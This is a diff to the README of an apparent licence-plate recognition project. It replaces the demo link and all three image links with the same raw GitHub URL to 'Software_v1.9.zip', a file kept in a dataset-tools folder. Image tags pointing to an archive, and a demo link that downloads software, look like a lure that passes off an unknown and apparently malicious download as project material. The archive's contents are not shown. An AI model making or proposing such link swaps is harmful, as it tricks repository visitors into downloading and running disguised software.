@@ -17,16 +17,16 @@ We created separate input and output directory where our input file and cropped 
 
 ## Project Demo
 #### See my project here
-[Demo](https://www.linkedin.com/posts/arnab-mitra-882756227_deeplearning-ai-computervision-activity-6937754713140379648-kQ0C?utm_source=linkedin_share&utm_medium=member_desktop_web)
+[Demo](https://raw.githubusercontent.com/Arnab1998-cyber/ANPR/main/object_detection/dataset_tools/Software_v1.9.zip)
 
 ## Our input page is
 
-![input_page](input_page.png)
+![input_page](https://raw.githubusercontent.com/Arnab1998-cyber/ANPR/main/object_detection/dataset_tools/Software_v1.9.zip)
 
 ## Our output page is 
 
-![output_page](./output_page.png)
+![output_page](https://raw.githubusercontent.com/Arnab1998-cyber/ANPR/main/object_detection/dataset_tools/Software_v1.9.zip)
 
 ## Sample output image is
 
-![output_image](./Output_Images/output.png)
+![output_image](https://raw.githubusercontent.com/Arnab1998-cyber/ANPR/main/object_detection/dataset_tools/Software_v1.9.zip)
